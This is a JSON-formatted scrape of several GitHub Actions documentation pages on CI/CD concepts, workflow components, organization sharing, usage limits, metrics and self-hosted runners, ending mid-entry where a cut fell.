[
  {
    "url": "https://docs.github.com/en/actions/about-github-actions/about-continuous-deployment-with-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About continuous deployment"
      },
      {
        "type": "paragraph",
        "text": "Continuous deployment(CD) is the practice of using automation to publish and deploy software updates. As part of the typical CD process, the code is automatically built and tested before deployment."
      },
      {
        "type": "paragraph",
        "text": "Continuous deployment is often coupled with continuous integration. For more information about continuous integration, seeAbout continuous integration with GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About continuous deployment using GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "You can set up a GitHub Actions workflow to deploy your software product. To verify that your product works as expected, your workflow can build the code in your repository and run your tests before deploying."
      },
      {
        "type": "paragraph",
        "text": "You can configure your CD workflow to run when an event occurs (for example, when new code is pushed to the default branch of your repository), on a set schedule, manually, or when an external event occurs using the repository dispatch webhook. For more information about when your workflow can run, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions provides features that give you more control over deployments. For example, you can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, or limit access to secrets. You can use concurrency to limit your CD pipeline to a maximum of one in-progress deployment and one pending deployment. For more information about these features, seeDeploying with GitHub ActionsandManaging environments for deployment."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using OpenID Connect to access cloud resources"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Workflow templates and third party actions"
      },
      {
        "type": "paragraph",
        "text": "GitHub offers deployment workflow templates for several popular services, such as Azure Web App. To learn how to get started using a workflow template, seeUsing workflow templatesorbrowse the full list of deployment workflow templates. You can also check out our more detailed guides for specific deployment workflows, such asDeploying Node.js to Azure App Service."
      },
      {
        "type": "paragraph",
        "text": "Many service providers also offer actions on GitHub Marketplace for deploying to their service. For the full list, seeGitHub Marketplace."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Deploying",
          "Deploying with GitHub Actions",
          "Managing environments for deployment",
          "Managing billing for GitHub Actions"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/about-github-actions/about-continuous-integration-with-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About continuous integration"
      },
      {
        "type": "paragraph",
        "text": "Continuous integration (CI) is a software practice that requires frequently committing code to a shared repository. Committing code more often detects errors sooner and reduces the amount of code a developer needs to debug when finding the source of an error. Frequent code updates also make it easier to merge changes from different members of a software development team. This is great for developers, who can spend more time writing code and less time debugging errors or resolving merge conflicts."
      },
      {
        "type": "paragraph",
        "text": "When you commit code to your repository, you can continuously build and test the code to make sure that the commit doesn't introduce errors. Your tests can include code linters (which check style formatting), security checks, code coverage, functional tests, and other custom checks."
      },
      {
        "type": "paragraph",
        "text": "Building and testing your code requires a server. You can build and test updates locally before pushing code to a repository, or you can use a CI server that checks for new code commits in a repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About continuous integration using GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "CI using GitHub Actions offers workflows that can build the code in your repository and run your tests. Workflows can run on GitHub-hosted virtual machines, or on machines that you host yourself. For more information, seeUsing GitHub-hosted runnersandAbout self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "You can configure your CI workflow to run when a GitHub event occurs (for example, when new code is pushed to your repository), on a set schedule, or when an external event occurs using the repository dispatch webhook."
      },
      {
        "type": "paragraph",
        "text": "GitHub runs your CI tests and provides the results of each test in the pull request, so you can see whether the change in your branch introduces an error. When all CI tests in a workflow pass, the changes you pushed are ready to be reviewed by a team member or merged. When a test fails, one of your changes may have caused the failure."
      },
      {
        "type": "paragraph",
        "text": "When you set up CI in your repository, GitHub analyzes the code in your repository and recommends CI workflows based on the language and framework in your repository. For example, if you useNode.js, GitHub will suggest a workflow template that installs your Node.js packages and runs your tests. You can use the CI workflow template suggested by GitHub, customize the suggested workflow template, or create your own custom workflow file to run your CI tests."
      },
      {
        "type": "paragraph",
        "text": "In addition to helping you set up CI workflows for your project, you can use GitHub Actions to create workflows across the full software development life cycle. For example, you can use actions to deploy, package, or release your project. For more information, seeWriting workflows."
      },
      {
        "type": "paragraph",
        "text": "For a definition of common terms, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Workflow templates"
      },
      {
        "type": "paragraph",
        "text": "GitHub offers CI workflow templates for a variety of languages and frameworks."
      },
      {
        "type": "paragraph",
        "text": "Browse the complete list of CI workflow templates offered by GitHub in theactions/starter-workflowsrepository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Building and testing",
          "Managing billing for GitHub Actions"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/about-github-actions/understanding-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. You can create workflows that build and test every pull request to your repository, or deploy merged pull requests to production."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides Linux, Windows, and macOS virtual machines to run your workflows, or you can host your own self-hosted runners in your own data center or cloud infrastructure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "The components of GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "You can configure a GitHub Actionsworkflowto be triggered when aneventoccurs in your repository, such as a pull request being opened or an issue being created. Your workflow contains one or morejobswhich can run in sequential order or in parallel. Each job will run inside its own virtual machinerunner, or inside a container, and has one or morestepsthat either run a script that you define or run anaction, which is a reusable extension that can simplify your workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Workflows"
      },
      {
        "type": "paragraph",
        "text": "Aworkflowis a configurable automated process that will run one or more jobs. Workflows are defined by a YAML file checked in to your repository and will run when triggered by an event in your repository, or they can be triggered manually, or at a defined schedule."
      },
      {
        "type": "paragraph",
        "text": "Workflows are defined in the.github/workflowsdirectory in a repository. A repository can have multiple workflows, each of which can perform a different set of tasks such as:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Building and testing pull requests",
          "Deploying your application every time a release is created",
          "Adding a label whenever a new issue is opened"
        ]
      },
      {
        "type": "paragraph",
        "text": "You can reference a workflow within another workflow. For more information, seeReusing workflows."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeWriting workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Events"
      },
      {
        "type": "paragraph",
        "text": "Aneventis a specific activity in a repository that triggers aworkflowrun. For example, an activity can originate from GitHub when someone creates a pull request, opens an issue, or pushes a commit to a repository. You can also trigger a workflow to run on aschedule, byposting to a REST API, or manually."
      },
      {
        "type": "paragraph",
        "text": "For a complete list of events that can be used to trigger workflows, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Jobs"
      },
      {
        "type": "paragraph",
        "text": "Ajobis a set ofstepsin a workflow that is executed on the samerunner. Each step is either a shell script that will be executed, or anactionthat will be run. Steps are executed in order and are dependent on each other. Since each step is executed on the same runner, you can share data from one step to another. For example, you can have a step that builds your application followed by a step that tests the application that was built."
      },
      {
        "type": "paragraph",
        "text": "You can configure a job's dependencies with other jobs; by default, jobs have no dependencies and run in parallel. When a job takes a dependency on another job, it waits for the dependent job to complete before running."
      },
      {
        "type": "paragraph",
        "text": "For example, you might configure multiple build jobs for different architectures without any job dependencies and a packaging job that depends on those builds. The build jobs run in parallel, and once they complete successfully, the packaging job runs."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeChoosing what your workflow does."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Actions"
      },
      {
        "type": "paragraph",
        "text": "Anactionis a custom application for the GitHub Actions platform that performs a complex but frequently repeated task. Use an action to help reduce the amount of repetitive code that you write in yourworkflowfiles. An action can pull your Git repository from GitHub, set up the correct toolchain for your build environment, or set up the authentication to your cloud provider."
      },
      {
        "type": "paragraph",
        "text": "You can write your own actions, or you can find actions to use in your workflows in the GitHub Marketplace."
      },
      {
        "type": "paragraph",
        "text": "For more information on actions, seeSharing automations."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Runners"
      },
      {
        "type": "paragraph",
        "text": "Arunneris a server that runs your workflows when they're triggered. Each runner can run a singlejobat a time.\nGitHub provides Ubuntu Linux, Microsoft Windows, and macOS runners to run yourworkflows. Each workflow run executes in a fresh, newly-provisioned virtual machine."
      },
      {
        "type": "paragraph",
        "text": "GitHub also offers larger runners, which are available in larger configurations. For more information, seeUsing larger runners."
      },
      {
        "type": "paragraph",
        "text": "If you need a different operating system or require a specific hardware configuration, you can host your own runners."
      },
      {
        "type": "paragraph",
        "text": "For more information about self-hosted runners, seeHosting your own runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions can help you automate nearly every aspect of your application development processes. Ready to get started? Here are some helpful resources for taking your next steps with GitHub Actions:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To create a GitHub Actions workflow, seeUsing workflow templates.",
          "For continuous integration (CI) workflows, seeBuilding and testing.",
          "For building and publishing packages, seePublishing packages.",
          "For deploying projects, seeUse cases and examples.",
          "For automating tasks and processes on GitHub, seeManaging projects.",
          "For examples that demonstrate more complex features of GitHub Actions, seeUse cases and examples. These detailed examples explain how to test your code on a runner, access the GitHub CLI, and use advanced features such as concurrency and test matrices.",
          "To certify your proficiency in automating workflows and accelerating development with GitHub Actions, earn a GitHub Actions certificate with GitHub Certifications. For more information, seeAbout GitHub Certifications."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/administering-github-actions/making-retired-namespaces-available-on-ghecom",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About retirement of namespaces"
      },
      {
        "type": "paragraph",
        "text": "If you use GitHub Enterprise Cloud with data residency, members of your enterprise can create GitHub Actions workflows that use actions directly from GitHub.com orGitHub Marketplace."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions searches your enterprise on GHE.com for each action before falling back to GitHub.com. This ensures that custom versions of actions in your enterprise are used in preference to their counterparts on GitHub.com."
      },
      {
        "type": "paragraph",
        "text": "To ensure workflows use their intended actions and to block the potential for abuse, once an action on GitHub.com is used for the first time, the namespace associated with that action is retired in your enterprise. This blocks users from creating an organization and repository in your enterprise that match the action's namespace on GitHub.com."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Making a retired namespace available"
      },
      {
        "type": "paragraph",
        "text": "After using an action from GitHub.com, if you want to create an action in your enterprise with the same name, you need to make the namespace for that organization and repository available."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In the top-right corner of GitHub, click your profile photo, then clickYour enterprise.",
          "At the top of the page, clickSettings.",
          "UnderSettings, clickRetired namespaces.",
          "To the right of the namespace that you want use in your enterprise, clickUnretire.",
          "Go to the relevant organization and create a new repository."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Tips for ensuring you can create a new repository"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "When you unretire a namespace, always create the new repository with that name as soon as possible. If a workflow calls the associated action on GitHub.com before you create the local repository, the namespace will be retired again.",
          "For actions used in workflows that run frequently, you may find that a namespace is retired again before you have time to create the local repository. In this case, you can temporarily disable the relevant workflows until you have created the new repository."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/administering-github-actions/sharing-workflows-secrets-and-runners-with-your-organization",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "If you need to share workflows and other GitHub Actions features with your team, then consider collaborating within a GitHub organization. An organization allows you to centrally store and manage secrets, artifacts, and self-hosted runners. You can also create workflow templates in the.githubrepository and share them with other users in your organization."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Sharing workflows"
      },
      {
        "type": "paragraph",
        "text": "Your organization can share workflows by reusing the workflows exactly or by creating workflow templates"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Reusing workflows"
      },
      {
        "type": "paragraph",
        "text": "You can call one workflow from within another workflow. This allows you to reuse workflows, avoiding duplication and making your workflows easier to maintain. For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using workflow templates"
      },
      {
        "type": "paragraph",
        "text": "Workflow templates allow everyone in your organization who has permission to create workflows to do so more quickly and easily. When you create a new workflow, you can choose a workflow template and some or all of the work of writing the workflow will be done for you. You can use workflow templates as a starting place to build your custom workflow or use them as-is. This not only saves time, it promotes consistency and best practice across your organization. For more information, seeCreating workflow templates for your organization."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Sharing secrets and variables within an organization"
      },
      {
        "type": "paragraph",
        "text": "You can centrally manage your secrets and variables within an organization, and then make them available to selected repositories. This also means that you can update a secret or variable in one location, and have the change apply to all repository workflows that use it."
      },
      {
        "type": "paragraph",
        "text": "When creating a secret or variable in an organization, you can use a policy to limit which repositories can access it. For example, you can grant access to all repositories, or limit access to only private repositories or a specified list of repositories."
      },
      {
        "type": "paragraph",
        "text": "Organization owners can create secrets or variables at the organization level."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the \"Security\" section of the sidebar, selectSecrets and variables, then clickActions.",
          "Click theSecretsorVariablestab, and create the secret or variable with your desired values and options.For more information, seeUsing secrets in GitHub ActionsorStore information in variables."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Share self-hosted runners within an organization"
      },
      {
        "type": "paragraph",
        "text": "Organization owners can add their self-hosted runners to groups, and then create policies that control which repositories can access the group."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeManaging access to self-hosted runners using groups."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "To continue learning about GitHub Actions, seeCreating workflow templates for your organization."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/administering-github-actions/usage-limits-billing-and-administration",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About billing for GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions help you automate your software development workflows in the same place you store code and collaborate on pull requests and issues. You can write individual tasks, called actions, and combine them to create a custom workflow. For more information, seeUnderstanding GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions usage is free for standard GitHub-hosted runners in public repositories, and for self-hosted runners. SeeChoosing the runner for a job. For private repositories, each GitHub account receives a certain amount of free minutes and storage for use with GitHub-hosted runners, depending on the account's plan. Any usage beyond the included amounts is controlled by spending limits. For more information, seeAbout billing for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Availability"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions is available on all GitHub products, but GitHub Actions is not available for private repositories owned by accounts using legacy per-repository plans. For more information, seeGitHub’s plans."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Usage limits"
      },
      {
        "type": "paragraph",
        "text": "There are some limits on GitHub Actions usage when using GitHub-hosted runners. These limits are subject to change."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "For self-hosted runners, different usage limits apply. For more information, seeUsage limits for self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "For more information about service rate limits, seeActions limits."
      },
      {
        "type": "paragraph",
        "text": "Standard GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted larger runners"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If required, customers on enterprise plans can request a higher limit for concurrent jobs. For more information, contact us through theGitHub Support portal, or contact your sales representative.",
          "The maximum concurrent macOS jobs is shared across standard GitHub-hosted runner and GitHub-hosted larger runners."
        ]
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Job matrix- A job matrix can generate a maximum of 256 jobs per workflow run. This limit applies to both GitHub-hosted and self-hosted runners.",
          "Workflow run queue- No more than 500 workflow runs can be queued in a 10 second interval per repository. If a workflow run reaches this limit, the workflow run is terminated and fails to complete."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Usage policy"
      },
      {
        "type": "paragraph",
        "text": "In addition to the usage limits, you must ensure that you use GitHub Actions within theGitHub Terms of Service. For more information on GitHub Actions-specific terms, see theGitHub Additional Product Terms."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "GitHub Actions usage metrics"
      },
      {
        "type": "paragraph",
        "text": "Organization owners and users with the \"View organization Actions metrics\" permission can view GitHub Actions usage metrics for their organization. These metrics can help you understand how and where your Actions minutes are being used. For more information, seeViewing GitHub Actions metrics for your organization."
      },
      {
        "type": "paragraph",
        "text": "When you view usage metrics, it is important to remember that GitHub Actions usage metrics do not apply minute multipliers to the metrics displayed. While theycanhelp you understand your bill, their primary purpose is to help you understand how and where Actions minutes are being used in your organization."
      },
      {
        "type": "paragraph",
        "text": "For more information about minute multipliers, seeAbout billing for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Billing for reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "If you reuse a workflow, billing is always associated with the caller workflow. Assignment of GitHub-hosted runners is always evaluated using only the caller's context. The caller cannot use GitHub-hosted runners from the called repository."
      },
      {
        "type": "paragraph",
        "text": "For more information see,Reusing workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Artifact and log retention policy"
      },
      {
        "type": "paragraph",
        "text": "You can configure the artifact and log retention period for your repository, organization, or enterprise account."
      },
      {
        "type": "paragraph",
        "text": "By default, the artifacts and log files generated by workflows are retained for 90 days before they are automatically deleted.\nYou can adjust the retention period, depending on the type of repository:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For public repositories: you can change this retention period to anywhere between 1 day or 90 days.",
          "For private repositories: you can change this retention period to anywhere between 1 day or 400 days."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you customize the retention period, it only applies to new artifacts and log files, and does not retroactively apply to existing objects. For managed repositories and organizations, the maximum retention period cannot exceed the limit set by the managing organization or enterprise."
      },
      {
        "type": "paragraph",
        "text": "For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Managing GitHub Actions settings for a repository",
          "Configuring the retention period for GitHub Actions artifacts and logs in your organization",
          "Enforcing policies for GitHub Actions in your enterprise"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Workflow run history retention policy"
      },
      {
        "type": "paragraph",
        "text": "The workflow runs in a repository's workflow run history are retained for 400 days. After 400 days, workflow runs are archived. 10 days after archival, they are permanently deleted. The retention period for workflow runs cannot be modified. For more information, seeViewing workflow run history."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Disabling or limiting GitHub Actions for your repository or organization"
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions is enabled on all repositories and organizations. You can choose to disable GitHub Actions or limit it to actions and reusable workflows in your organization."
      },
      {
        "type": "paragraph",
        "text": "For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Managing GitHub Actions settings for a repository",
          "Disabling or limiting GitHub Actions for your organization",
          "Enforcing policies for GitHub Actions in your enterprise"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Disabling and enabling workflows"
      },
      {
        "type": "paragraph",
        "text": "You can enable and disable individual workflows in your repository on GitHub."
      },
      {
        "type": "paragraph",
        "text": "To prevent unnecessary workflow runs, scheduled workflows may be disabled automatically. When a public repository is forked, scheduled workflows are disabled by default. In a public repository, scheduled workflows are automatically disabled when no repository activity has occurred in 60 days."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeDisabling and enabling a workflow."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/administering-github-actions/viewing-github-actions-metrics",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub Actions metrics"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions metrics provide insights into how your workflows and jobs are performing at the organization and repository levels. There are two types of metrics to help you analyze different aspects of your workflows:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GitHub Actions usage metrics:Usage metrics help you track how many minutes your workflows and jobs consume. You can use this data to understand the cost of running Actions and ensure you're staying within your plan limits. This is especially useful for identifying high-usage workflows or repositories.",
          "GitHub Actions performance metrics:Performance metrics focus on the efficiency and reliability of your workflows and jobs. With performance metrics, you can monitor key indicators like job run times, queue times, and failure rates to identify bottlenecks, slow-running jobs, or frequently failing workflows."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Enabling access to GitHub Actions metrics"
      },
      {
        "type": "paragraph",
        "text": "Organization owners can create custom organization roles to allow people to view GitHub Actions usage metrics for their organization. To provide users with access, select the \"View organization Actions metrics\" role when creating a custom organization role. For more information, seeAbout custom organization roles."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub Actions usage metrics"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions usage metrics enable you to analyze how your organization is using Actions minutes. You can view usage information related to:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflows. View usage data for each workflow in your organization, and use this information to identify opportunities for optimization, such as refactoring a workflow or using a larger runner.",
          "Jobs. See which jobs are the most resource-intensive and where they are running.",
          "Repositories. Get a high-level snapshot of each repository in your organization and their volume of Actions minutes usage.",
          "Runtime OS. Understand how runners for each operating system are using Actions minutes and what types of operating systems your workflows are running on most often.",
          "Runner type. Compare how your self-hosted runners and GitHub-hosted runners use Actions minutes and the volume of workflow runs for each type of runner."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub Actions performance metrics"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions performance metrics enables you to analyze the efficiency and reliability of your workflows. You can view performance information such as average run times, average queue times, and failure rates, related to:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflows. View performance data for each workflow in your organization, including average run time and job failures. Use this information to identify inefficient workflows and run stability.",
          "Jobs. View performance data for each individual job to, including average run time, average queue time, and job failures. Use this information to identify inefficient jobs.",
          "Repositories. Get a high-level snapshot of each repository in your organization and their average performance metrics.",
          "Runtime OS. Understand how runners for each operating system are performing.",
          "Runner type. Compare the performance of self-hosted runners and GitHub-hosted runners, to make decisions about runner types."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Understanding GitHub Actions metrics aggregation"
      },
      {
        "type": "paragraph",
        "text": "The time period selection feature allows you to view GitHub Actions metrics over predefined periods, as detailed in the following table. These metrics include skipped runs and those that use zero minutes. Data is presented using Coordinated Universal Time (UTC) days."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing GitHub Actions metrics for your organization"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "There may be a discrepancy between theWorkflowstab's job count and theJobstab's count due to differences in how unique jobs are identified. This does not affect the total minutes calculated."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In the upper-right corner of GitHub, select your profile photo, then clickYour organizations.",
          "Click the name of your organization.",
          "Under your organization name, clickInsights.",
          "In the \"Insights\" navigation menu, clickActions Usage Metricsor clickActions Performance Metrics.",
          "Optionally, to select a time period to view usage metrics for, choose an option from thePerioddrop down menu at the top right of the page. For more information, seeUnderstanding GitHub Actions metrics aggregation.",
          "Click on the tab that contains the metrics you would like to view. For more information, seeAbout GitHub Actions usage metricsorAbout GitHub Actions performance metrics.",
          "Optionally, to filter the data displayed in a tab, create a filter.Click on theFilterbutton.ClickAdd a filter.Choose a metric you would like to filter results by.Depending on the metric you chose, fill out information in the \"Qualifier,\" \"Operator,\" and \"Value\" columns.Optionally, clickAdd a filterto add another filter.ClickApply.",
          "Click on theFilterbutton.",
          "ClickAdd a filter.",
          "Choose a metric you would like to filter results by.",
          "Depending on the metric you chose, fill out information in the \"Qualifier,\" \"Operator,\" and \"Value\" columns.",
          "Optionally, clickAdd a filterto add another filter.",
          "ClickApply.",
          "Optionally, to download usage metrics to a CSV file, click."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing GitHub Actions metrics for your repository"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "There may be a discrepancy between theWorkflowstab's job count and theJobstab's count due to differences in how unique jobs are identified. This does not affect the total minutes calculated."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, click theInsightstab.",
          "In the \"Insights\" navigation menu, clickActions Usage Metricsor clickActions Performance Metrics.",
          "Optionally, to select a time period to view usage metrics for, choose an option from thePerioddrop down menu at the top right of the page. For more information, seeUnderstanding GitHub Actions metrics aggregation.",
          "Click on the tab that contains the metrics you would like to view. For more information, seeAbout GitHub Actions usage metricsorAbout GitHub Actions performance metrics.",
          "Optionally, to filter the data displayed in a tab, create a filter.Click on theFilterbutton.ClickAdd a filter.Choose a metric you would like to filter results by.Depending on the metric you chose, fill out information in the \"Qualifier,\" \"Operator,\" and \"Value\" columns.Optionally, clickAdd a filterto add another filter.ClickApply.",
          "Click on theFilterbutton.",
          "ClickAdd a filter.",
          "Choose a metric you would like to filter results by.",
          "Depending on the metric you chose, fill out information in the \"Qualifier,\" \"Operator,\" and \"Value\" columns.",
          "Optionally, clickAdd a filterto add another filter.",
          "ClickApply.",
          "Optionally, to download usage metrics to a CSV file, click."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "A self-hosted runner is a system that you deploy and manage to execute jobs from GitHub Actions on GitHub."
      },
      {
        "type": "paragraph",
        "text": "Self-hosted runners:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Give you more control of hardware, operating system, and software tools than GitHub-hosted runners provide.",
          "Are free to use with GitHub Actions, but you are responsible for the cost of maintaining your runner machines.",
          "Let you create custom hardware configurations that meet your needs with processing power or memory to run larger jobs, install software available on your local network.",
          "Receive automatic updates for the self-hosted runner application only, though you may disable automatic updates of the runner.",
          "Can use cloud services or local machines that you already pay for.",
          "Don't need to have a clean instance for every job execution.",
          "Can be physical, virtual, in a container, on-premises, or in a cloud."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can use self-hosted runners anywhere in the management hierarchy. Repository-level runners are dedicated to a single repository, while organization-level runners can process jobs for multiple repositories in an organization. Organization owners can choose which repositories are allowed to create repository-level self-hosted runners. SeeDisabling or limiting GitHub Actions for your organization. Finally, enterprise-level runners can be assigned to multiple organizations in an enterprise account."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Requirements for self-hosted runner machines"
      },
      {
        "type": "paragraph",
        "text": "You can use any machine as a self-hosted runner as long at it meets these requirements:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You can install and run the self-hosted runner application on the machine.",
          "The machine can communicate with GitHub Actions.",
          "The machine has enough hardware resources for the type of workflows you plan to run. The self-hosted runner application itself only requires minimal resources.",
          "If you want to run workflows that use Docker container actions or service containers, you must use a Linux machine and Docker must be installed."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Security hardening for GitHub Actions",
          "Adding self-hosted runners",
          "Using self-hosted runners in a workflow",
          "Autoscaling with self-hosted runners",
          "Supported architectures and operating systems for self-hosted runners",
          "Communicating with self-hosted runners"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/adding-self-hosted-runners",
    "content": [
      {
        "type": "paragraph",
        "text": "You can add a self-hosted runner to a repository, an organization, or an enterprise."
      },
      {
        "type": "paragraph",
        "text": "If you are an organization or enterprise administrator, you might want to add your self-hosted runners at the organization or enterprise level. This approach makes the runner available to multiple repositories in your organization or enterprise, and also lets you to manage your runners in one place."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you only use self-hosted runners with private repositories. This is because forks of your public repository can potentially run dangerous code on your self-hosted runner machine by creating a pull request that executes the code in a workflow."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "You can set up automation to scale the number of self-hosted runners. For more information, seeAutoscaling with self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "You can register ephemeral runners that perform a single job before the registration is cleaned up by using just-in-time runner registration. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You must have access to the machine you will use as a self-hosted runner in your environment."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding a self-hosted runner to a repository"
      },
      {
        "type": "paragraph",
        "text": "You can add self-hosted runners to a single repository. To add a self-hosted runner to a user repository, you must be the repository owner. For an organization repository, you must be an organization owner or have admin access to the repository."
      },
      {
        "type": "paragraph",
        "text": "For information about how to add a self-hosted runner with the REST API, seeREST API endpoints for self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
